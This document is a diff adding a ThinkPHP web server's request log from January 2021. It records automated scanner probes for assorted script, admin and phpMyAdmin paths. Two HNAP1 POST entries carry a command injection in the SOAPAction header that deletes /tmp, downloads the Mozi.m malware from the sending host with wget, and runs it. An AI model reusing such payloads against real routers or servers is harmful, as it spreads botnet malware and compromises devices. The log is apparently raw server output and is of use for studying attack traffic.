+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.113',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.113 GET 101.37.13.45/11.txt
+[运行时间：0.062664s] [吞吐率：15.96req/s] [内存消耗：1,834.31kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '11.txt',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.113',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.113 GET 101.37.13.45/cloud-app/include/css/uncall.css
+[运行时间：0.048987s] [吞吐率：20.41req/s] [内存消耗：1,834.55kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cloud-app',
+    1 => 'include',
+    2 => 'css',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.113',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.113 GET 101.37.13.45/Public/Wchat/js/cvphp.js
+[运行时间：0.035677s] [吞吐率：28.03req/s] [内存消耗：1,834.74kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Public',
+    1 => 'Wchat',
+    2 => 'js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.113',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.114 GET 101.37.13.45/source/pack/upload/install/ios.php
+[运行时间：0.017968s] [吞吐率：55.65req/s] [内存消耗：1,835.02kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'source',
+    1 => 'pack',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+  'install' => 'ios.php',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.114 GET 101.37.13.45/static/admin/js/cvphp.js
+[运行时间：0.017800s] [吞吐率：56.18req/s] [内存消耗：1,834.74kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'admin',
+    2 => 'js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.114 GET 101.37.13.45/public/static/js/main.js
+[运行时间：0.030078s] [吞吐率：33.25req/s] [内存消耗：1,834.77kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'public',
+    1 => 'static',
+    2 => 'js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.114 GET 101.37.13.45/pczs/js/trendChart.js
+[运行时间：0.017639s] [吞吐率：56.69req/s] [内存消耗：1,834.38kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'pczs',
+    1 => 'js',
+    2 => 'trendChart.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.114 GET 101.37.13.45/js/guest.js
+[运行时间：0.125059s] [吞吐率：8.00req/s] [内存消耗：1,834.32kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'js',
+    1 => 'guest.js',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.114 GET 101.37.13.45/js/room.js
+[运行时间：0.158538s] [吞吐率：6.31req/s] [内存消耗：1,834.31kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'js',
+    1 => 'room.js',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.114 GET 101.37.13.45/static/js/base.js
+[运行时间：0.117631s] [吞吐率：8.50req/s] [内存消耗：1,834.38kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'js',
+    2 => 'base.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:10+08:00 ] 96.5.50.114 GET 101.37.13.45/phpcms/modules/member/touzi.php
+[运行时间：0.111415s] [吞吐率：8.98req/s] [内存消耗：1,834.62kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpcms',
+    1 => 'modules',
+    2 => 'member',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:11+08:00 ] 96.5.50.114 GET 101.37.13.45/mmbh/login.php
+[运行时间：0.166842s] [吞吐率：5.99req/s] [内存消耗：1,834.44kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'mmbh',
+    1 => 'login.php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:11+08:00 ] 96.5.50.114 GET 101.37.13.45/admin/css/style.css
+[运行时间：0.138048s] [吞吐率：7.24req/s] [内存消耗：1,843.57kb] [文件加载：36]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'css',
+    2 => 'style.css',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:11+08:00 ] 96.5.50.114 GET 101.37.13.45/app/common.js?version=2.4.43&build=1563436823
+[运行时间：0.116353s] [吞吐率：8.59req/s] [内存消耗：1,835.21kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'app',
+    1 => 'common.js',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+  'version' => '2.4.43',
+  'build' => '1563436823',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:11+08:00 ] 96.5.50.114 GET 101.37.13.45/Public/app/js/cvphp.js
+[运行时间：0.093661s] [吞吐率：10.68req/s] [内存消耗：1,834.40kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Public',
+    1 => 'app',
+    2 => 'js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:11+08:00 ] 96.5.50.114 GET 101.37.13.45/resources/main/common.js
+[运行时间：0.079195s] [吞吐率：12.63req/s] [内存消耗：1,834.74kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'resources',
+    1 => 'main',
+    2 => 'common.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:11+08:00 ] 96.5.50.114 GET 101.37.13.45/web/api/getConfig?type=several&keys=www_app_base:downloadUrl1,www_app_base:downloadUrl4&accessToken=undefined
+[运行时间：0.064016s] [吞吐率：15.62req/s] [内存消耗：1,836.03kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'web',
+    1 => 'api',
+    2 => 'getConfig',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+  'type' => 'several',
+  'keys' => 'www_app_base:downloadUrl1,www_app_base:downloadUrl4',
+  'accessToken' => 'undefined',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T15:02:11+08:00 ] 96.5.50.114 GET 101.37.13.45/index/index/register1/type/1.html
+[运行时间：0.049957s] [吞吐率：20.02req/s] [内存消耗：1,837.72kb] [文件加载：36]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'register1',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'x-forwarded-for' => '96.5.50.114',
+)
+[ info ] [ PARAM ] array (
+  'type' => '1',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T18:09:27+08:00 ] 49.69.215.84 POST 101.37.13.45:80/HNAP1/
+[运行时间：0.015569s] [吞吐率：64.23req/s] [内存消耗：1,859.81kb] [文件加载：34]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'HNAP1',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'soapaction' => 'http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://49.69.215.84:59036/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`',
+  'content-type' => 'text/xml; charset="utf-8"',
+  'content-length' => '640',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T18:11:34+08:00 ] 2.187.86.96 GET 101.37.13.45:80/
+[运行时间：0.022337s] [吞吐率：44.77req/s] [内存消耗：1,760.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T18:15:57+08:00 ] 47.101.199.54 GET 101.37.13.45/
+[运行时间：0.015425s] [吞吐率：64.83req/s] [内存消耗：1,760.34kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => '101.37.13.45',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T18:44:14+08:00 ] 209.141.60.195 GET 101.37.13.45:80/config/getuser?index=0
+[运行时间：0.018559s] [吞吐率：53.88req/s] [内存消耗：1,835.16kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'config',
+    1 => 'getuser',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-GB,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  'index' => '0',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T23:05:19+08:00 ] 128.14.209.234 GET 101.37.13.45/
+[运行时间：0.017267s] [吞吐率：57.91req/s] [内存消耗：1,760.65kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T23:20:52+08:00 ] 117.241.67.5 POST 101.37.13.45:80/HNAP1/
+[运行时间：0.018402s] [吞吐率：54.34req/s] [内存消耗：1,859.81kb] [文件加载：34]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'HNAP1',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'soapaction' => 'http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://117.241.67.5:33111/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`',
+  'content-type' => 'text/xml; charset="utf-8"',
+  'content-length' => '640',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-18T23:33:30+08:00 ] 209.141.58.184 GET 101.37.13.45/phpMyAdmin/scripts/setup.php
+[运行时间：0.018660s] [吞吐率：53.59req/s] [内存消耗：1,834.29kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpMyAdmin',
+    1 => 'scripts',
+    2 => 'setup.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'accept' => '*/*',
+  'accept-language' => 'en-us',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'ZmEu',
+  'host' => '101.37.13.45',
+  'connection' => 'Close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
